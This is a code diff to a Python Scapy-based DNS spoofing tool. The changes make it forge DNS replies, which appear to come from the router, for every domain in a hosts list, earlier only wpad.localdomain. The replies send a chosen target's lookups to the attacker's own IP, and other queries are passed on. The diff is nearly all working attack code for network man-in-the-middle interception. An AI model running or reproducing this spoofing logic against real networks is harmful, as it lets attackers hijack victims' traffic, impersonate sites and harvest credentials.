@@ -24,9 +24,12 @@ domains = hosts_dict.keys()
 
 
 def forge_packet_better(packet_to_forge, target_ip,router_ip):
+
     original_qname = packet_to_forge[DNSQR].qname
-    print(original_qname)
-    if "wpad.localdomain" in str(original_qname):
+    print(packet_to_forge[DNS].qd.qname.decode('UTF-8'))
+    print(str(original_qname))
+    if str(original_qname) in domains:
+        print("DETECTED DNS TO FORGE")
         fake_dns_packet = IP()/UDP()/DNS()/DNSRR()
 
         fake_dns_packet[IP].src = router_ip
@@ -41,11 +44,11 @@ def forge_packet_better(packet_to_forge, target_ip,router_ip):
         fake_dns_packet[DNS].qr = 1
         fake_dns_packet[DNS].ancount = 1
 
-        fake_dns_packet[DNSRR].qname = 'wpad.localdomain.'
-        fake_dns_packet[DNSRR].rrname = 'wpad.localdomain.'
+        fake_dns_packet[DNSRR].qname = str(original_qname)
+        fake_dns_packet[DNSRR].rrname = str(original_qname)
         fake_dns_packet[DNSRR].rdata = local_ip
 
-        print(f"Sending spoofed DNS packet: wpad.localdomain = {local_ip}")
+        print(f"Sending spoofed DNS packet: {original_qname} = {local_ip}")
         send(fake_dns_packet, verbose=0)
     else:
         forward_packet = IP()/UDP()/DNS()
@@ -73,10 +76,12 @@ def forge_packet(packet_to_forge, fake_server_ip):
     return forged_packet
 
 def process_dns_packet(packet_to_process, target, router_ip):
-    print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
-    print(packet_to_process[IP].src)
-    current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
-    if target is None or packet_to_process[IP].src == target:
+    # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
+    # print(packet_to_process[IP].src)
+    # print(target)
+    # current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
+    if packet_to_process[IP].src == target:
+        print("packet of target")
         forge_packet_better(packet_to_process, target, router_ip)
 
             # forged_packet = forge_packet(packet_to_process, ip)
